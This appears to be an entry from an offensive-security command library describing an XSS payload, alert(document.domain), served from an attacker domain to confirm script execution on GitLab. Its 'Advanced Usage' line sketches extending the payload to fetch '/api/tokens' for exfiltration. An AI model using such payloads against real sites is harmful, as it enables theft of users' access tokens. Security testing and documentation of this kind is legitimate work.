---
data: alert(document.domain)
tags:
  - xss
  - payload
type: command
output: Alert box showing 'gitlab.com'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.805Z'
id: 07559098-6187-4108-ba09-0d82a6fa26f0
verified: false
validated: true
submitted: true
---
# host-alert-payload

## Command

```javascript
alert(document.domain)
```

## Description

Simple JavaScript payload hosted on attacker domain to demonstrate XSS execution by alerting the current domain, confirming victim context in GitLab.

## Parameters

None.

## Examples

### Basic Usage

Save as hack.js and serve.

### Advanced Usage

Extend to: fetch('/api/tokens').then(r => r.json()).then(data => /* exfil */);

## Expected Output

Browser alert popup with 'gitlab.com'.

## Related

- [[commands/inject-base-tag-payload]]
- [[procedures/Set-Up-Attacker-Web-Server-for-Script-Hosting]]
